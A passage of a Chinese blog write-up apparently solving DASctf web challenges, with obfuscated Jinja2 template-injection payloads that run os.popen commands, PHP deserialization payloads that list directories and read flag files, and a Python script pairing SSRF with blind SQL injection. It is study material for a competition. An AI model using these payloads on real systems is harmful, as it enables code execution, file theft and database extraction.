x()|attr(un~dict(module&#x3D;a)|join)|attr(un~un~dict(built&#x3D;a,ins&#x3D;b)|join~un~un)|attr(gti)((un~un~dict(imp&#x3D;a,ort&#x3D;a)|join~un~un))(dict(o&#x3D;a,s&#x3D;a)|join)|attr(dict(po&#x3D;a,pen&#x3D;a)|join)(dict(pw&#x3D;a,d&#x3D;a)|join)|attr(dict(re&#x3D;a,ad&#x3D;a)|join)()|string|list|first%&#125;&#123;%print(x()|attr(un~dict(module&#x3D;a)|join)|attr(un~un~dict(built&#x3D;a,ins&#x3D;b)|join~un~un)|attr(gti)((un~un~dict(imp&#x3D;a,ort&#x3D;a)|join~un~un))(dict(o&#x3D;a,s&#x3D;a)|join)|attr(dict(po&#x3D;a,pen&#x3D;a)|join)(dict(ls&#x3D;a)|join)~sla~dict(start&#x3D;a)|join~dot~dict(sh&#x3D;a)|join|attr(dict(re&#x3D;a,ad&#x3D;a)|join)())%&#125;&#123;%endif%&#125;&#123;%endfor%&#125; </span><br><span class="line"></span><br><span class="line">feng师傅</span><br><span class="line">&#123;% set id&#x3D;dict(ind&#x3D;a,ex&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set pp&#x3D;dict(po&#x3D;a,p&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set ls&#x3D;dict(ls&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set ppe&#x3D;dict(po&#x3D;a,pen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set gt&#x3D;dict(ge&#x3D;a,t&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cr&#x3D;dict(ch&#x3D;a,r&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set nn&#x3D;dict(n&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set tt&#x3D;dict(t&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set ff&#x3D;dict(f&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set ooqq&#x3D;dict(o&#x3D;a,s&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set rd&#x3D;dict(re&#x3D;a,ad&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set five&#x3D;(lipsum|string|list)|attr(id)(tt) %&#125;</span><br><span class="line">&#123;% set three&#x3D;(lipsum|string|list)|attr(id)(nn) %&#125;</span><br><span class="line">&#123;% set one&#x3D;(lipsum|string|list)|attr(id)(ff) %&#125;</span><br><span class="line">&#123;% set shiba&#x3D;five*five-three-three-one %&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pp)(shiba) %&#125;&#123;% set gb&#x3D;(xiahuaxian,xiahuaxian,dict(glob&#x3D;a,als&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set bin&#x3D;(xiahuaxian,xiahuaxian,dict(builtins&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set chcr&#x3D;(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set xiegang&#x3D;chcr(three*five*five-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one-one)%&#125;</span><br><span class="line">&#123;% set space&#x3D;chcr(three*three*five-five-five-three) %&#125;</span><br><span class="line">&#123;% set shell&#x3D;(ls,space,xiegang,dict(var&#x3D;a)|join,xiegang,dict(www&#x3D;a)|join,xiegang,dict(flask&#x3D;a)|join)|join %&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(gb))|attr(gt)(ooqq)|attr(ppe)(shell)|attr(rd)()&#125;&#125;</span><br><span class="line">感觉feng师傅这个比较像预期解</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/2-3.jpg"></p>
+<p>这篇<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425">羽师傅-SSTI 模板注入绕过（进阶篇）</a>总结的很全面</p>
+<blockquote>
+<p>参考<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115272645">https://blog.csdn.net/rfrder/article/details/115272645</a> &gt; <a target="_blank" rel="noopener" href="https://shimo.im/docs/lf9OcEmdH70MC17f/read">https://shimo.im/docs/lf9OcEmdH70MC17f/read</a></p>
+</blockquote>
+<h3 id="3-ez-serialize"><a href="#3-ez-serialize" class="headerlink" title="3.ez_serialize"></a>3.ez_serialize</h3><ul>
+<li>SPL 是什么？<br>顾名思义，SPL 就是 Standard PHP Library 的缩写。据手册显示，SPL 是用于解决典型问题(standard problems)的一组接口与类的集合。打开手册，正如上面的定义一样，有许多封装好的类。因为是要解决典型问题，免不了有一些处理文件的类。</li>
+<li>SLP 类中存在能够进行文件处理和迭代的类：</li>
+</ul>
+<p>类 描述<br>DirectoryIterator| 遍历目录<br>FilesystemIterator | 遍历目录<br>GlobIterator 遍历目录，但是不同的点在于它可以通配例如/var/html/www/flag*<br>SplFileObject 读取文件，按行读取，多行需要遍历<br>finfo/finfo_open() 需要两个参数<br>源码：</p>
+<ul>
+<li>判断了给出的 A、B、C 三个类都没有什么危险函数，应该是没有利用的点，想到应该是原生类的利用。</li>
+</ul>
+<ul>
+<li>源码<br><img src="/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/3-1.jpg"></li>
+</ul>
+<ul>
+<li>直接读取/var/www/html 下文件有哪些,得到一个 flag 所在的文件夹，再遍历这个文件夹发现存在 flag.php</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;FilesystemIterator&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure>
+
+<p>得到序列化字符串<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:18:&quot;FilesystemIterator&quot;;s:4:&quot;para&quot;;s:13:&quot;/var/www/html&quot;;s:5:&quot;check&quot;;N;&#125;</code><br>回显 html 下的文件夹<code> 1aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE</code></p>
+<ul>
+<li>读取 flag</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $class=<span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $para=<span class="string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $check;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$o  = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($o);</span><br></pre></td></tr></table></figure>
+
+<p>序列化字符串<code>O:1:&quot;A&quot;:3:&#123;s:5:&quot;class&quot;;s:13:&quot;SplFileObject&quot;;s:4:&quot;para&quot;;s:55:&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;;s:5:&quot;check&quot;;N;&#125;</code></p>
+<blockquote>
+<p>参考<br><a target="_blank" rel="noopener" href="http://www.plasf.cn/articles/dasctf202103.html">http://www.plasf.cn/articles/dasctf202103.html</a></p>
+</blockquote>
+<h3 id="4-ez-login"><a href="#4-ez-login" class="headerlink" title="4.ez_login"></a>4.ez_login</h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
+</blockquote>
+<ul>
+<li>考点:SSRF 和 session 绕过<br>第一点绕过 SESSION 只需要 PHP_SESSION_UPLOAD_PROGRESS 就完事了。注入 Boo 了盲注， SSRF 和 session 绕过</li>
+</ul>
+<ul>
+<li>给了源码</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Index.php</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION))&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no session&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    $url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(check_inner_ip($url))&#123;</span><br><span class="line">        <span class="keyword">if</span>($url)&#123;</span><br><span class="line">            $ch = curl_init();</span><br><span class="line">            curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">            curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">            curl_setopt($ch, CURLOPT_FOLLOWLOCATION,<span class="number">1</span>);</span><br><span class="line">            $output = curl_exec($ch);</span><br><span class="line">            $result_info = curl_getinfo($ch);</span><br><span class="line">            curl_close($ch);</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Your IP is internal yoyoyo&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>se1f_log3n.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/db.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./php/check_ip.php&quot;</span>);</span><br><span class="line">error_reporting(E_ALL);</span><br><span class="line">$ip = $_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($ip !== <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">    $sql = <span class="string">&#x27;SELECT `username`,`password` FROM `user` WHERE `username`= &quot;&#x27;</span>.$username.<span class="string">&#x27;&quot; and `password`=&quot;&#x27;</span>.$password.<span class="string">&#x27;&quot;;&#x27;</span>;</span><br><span class="line">    $result = $con-&gt;query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $sql;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> $e)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $e-&gt;getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">    ($result-&gt;num_rows &gt; <span class="number">0</span> <span class="keyword">AND</span> $row = $result-&gt;fetch_assoc() <span class="keyword">AND</span> $con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>)) <span class="keyword">OR</span> ( ($con-&gt;close() <span class="keyword">AND</span> <span class="keyword">die</span>(<span class="string">&#x27;Try again!&#x27;</span>) ));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大佬脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">70</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">        url = <span class="string">&quot;http://6ac49c07-405e-454b-8b76-50c4b3adb45d.machine.dasctf.com/?url=http://localhost/se1f_Log3n.php?username=admin&#x27; password regexp binary %s-- #&amp;password=admin&quot;</span>%(j)</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session = requests.session()</span><br><span class="line">        resp = session.post(url,data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;x&#x27;</span>&#125;,files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            flag = flag +j</span><br><span class="line">            print(j)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>复现问题：<ul>
+<li>大佬的脚本好像出了点问题，下次再写吧</li>
+</ul>
+</li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://example.com">JOe KKK</a>
+            <p>原文链接：<a href="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/">http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/</a>
+            <p>发表日期：<a href="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/">April 6th 2021, 10:06:06 pm</a>
+            <p>更新日期：<a href="http://example.com/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/">April 9th 2021, 9:35:30 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2021/04/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/" title= "红明谷-web 复现">
+                    <div class="nextTitle">红明谷-web 复现</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2021/04/04/bugku/" title= "bugku-web题">
+                    <div class="prevTitle">bugku-web题</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DASctf-web-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">DASctf-web 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-BestDB8"><span class="toc-number">1.1.</span> <span class="toc-text">1.BestDB8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-baby-flask"><span class="toc-number">1.2.</span> <span class="toc-text">2.baby_flask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-ez-serialize"><span class="toc-number">1.3.</span> <span class="toc-text">3.ez_serialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-ez-login"><span class="toc-number">1.4.</span> <span class="toc-text">4.ez_login</span></a></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 31
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2021/04/08/ctfshow-ssrf/" >ctfshow&ctfhub-ssrf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2021/04/06/CTF%E6%AF%94%E8%B5%9B/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF/" >红明谷-web 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2021/04/06/CTF%E6%AF%94%E8%B5%9B/DASctf/" >DASctf-web 复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span><a class="archive-post-title" href= "/2021/04/04/bugku/" >bugku-web题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/02</span><a class="archive-post-title" href= "/2021/04/02/CTF%E6%AF%94%E8%B5%9B/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" >2020西湖论剑-web复现</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/28</span><a class="archive-post-title" href= "/2021/03/28/upload-labs/upload-labs/" >upload-labs</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2021/03/26/xss-labs/" >xss-labs</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2021/03/24/sql-labs/PAGE-2(Advanced%20Injections)/" >PAGE-2(Advanced Injections)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2021/03/24/sql-labs/PAGE-1(Basic%20Challenges)/" >PAGE-1(Basic Challenges)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/24</span><a class="archive-post-title" href= "/2021/03/24/sql-labs/PAGE-3&4/" >PAGE-3(Stacked Challenges)--PAGE-4(Challenges)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/nmap/" >Nmap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/netcat/" >Netcat</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/01</span><a class="archive-post-title" href= "/2021/03/01/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/wireshark-tcpdump/" >wireshark-tcpdump</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span><a class="archive-post-title" href= "/2021/02/27/dvwa/XSS-stored/" >XSS-stored</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span><a class="archive-post-title" href= "/2021/02/26/dvwa/XSS-reflected/" >XSS-reflected</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2021/02/25/dvwa/SQL%20Injection/" >SQL Injection</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/24</span><a class="archive-post-title" href= "/2021/02/24/dvwa/File%20inclusion/" >File inclusion</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/23</span><a class="archive-post-title" href= "/2021/02/23/dvwa/CSRF/" >CSRF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/21</span><a class="archive-post-title" href= "/2021/02/21/dvwa/Command%20injection/" >Command injection</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/20</span><a class="archive-post-title" href= "/2021/02/20/dvwa/Brute%20Force/" >Brute Force</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/15</span><a class="archive-post-title" href= "/2021/02/15/CDN%E8%AE%B2%E8%A7%A3/" >CDN</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href= "/2021/02/01/xctf/i-got-id-200/" >i-got-id-200--ARGV的利用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span><a class="archive-post-title" href= "/2021/02/01/xctf/kk/" >Flat---sql注入之sqlite3数据库</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2020/11/26/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" >Burp suit</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/26</span><a class="archive-post-title" href= "/2020/11/26/xctf/unfinsh/" >unfinsh--二次注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2020/11/18/xctf/fakebook/" >fakebook--sql注入和反序列-file伪协议</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2020/11/18/xctf/Cat/" >Cat---%80报错和@前缀发送文件</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/16</span><a class="archive-post-title" href= "/2020/11/16/xctf/favorite-number/" >favorite_number-溢出绕过-跨行绕过-tac绕过</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2020/10/16/xctf/web%E6%96%B0%E6%89%8B%E9%A2%98/" >web新手题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2020/10/16/xctf/web%E8%BF%9B%E9%98%B6%E9%A2%98/" >web进阶</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/15</span><a class="archive-post-title" href= "/2020/10/15/my%20first%20blog/" >Mac下基于GitHub的Hexo博客搭建</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="知识普及"><span class="iconfont-archer">&#xe606;</span>知识普及</span>
+    
+        <span class="sidebar-tag-name" data-tags="小问题"><span class="iconfont-archer">&#xe606;</span>小问题</span>
+    
+        <span class="sidebar-tag-name" data-tags="XCTF"><span class="iconfont-archer">&#xe606;</span>XCTF</span>
+    
